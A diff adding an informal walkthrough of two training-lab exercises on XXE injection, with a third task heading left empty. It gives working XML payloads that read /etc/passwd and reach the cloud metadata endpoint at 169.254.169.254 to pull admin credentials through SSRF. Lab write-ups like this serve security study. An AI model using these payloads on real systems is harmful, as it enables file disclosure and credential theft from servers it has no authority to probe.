@@ -1,0 +1,28 @@
+Task 1:
+///Lab: Exploiting XXE using external entities to retrieve files///
+
+Open the site in burpsuite, click one of the products and check the stock. After this switch to burpsuite-s window, and check http history.
+There should be a Post request called /product/stock. Send this request to repeater.
+At the end of the request you can see this:
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+This is the part when the front end (your browser) asks down the data from the backend (server) through xml.
+But if its not configured well, like in this lab, we can create "entities", and get more data from the server like it should allow.
+This is how...Change those lines like this:ű
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+Send, and we solved the lab. In the response you can see the file's data.
+
+Task 2:
+///Lab: Exploiting XXE to perform SSRF attacks///
+
+Just like in task 1, open the lab in burp, check one of the products id, and in burpsuite send the post request to repeater.
+The end of the request is the same:
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+And we have to modify with <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>, but this time we got a hint: "metadata endpoint at the default URL, which is http://169.254.169.254/"
+So modify the line like: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> , change productId to &xxe; just like before and send it...in the response you will see something like: "Invalid product ID: latest"
+Copy this into our payload: <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/"> ]> and send it. and keep following the same until you get the admin's data.
+
+Task 3:
+
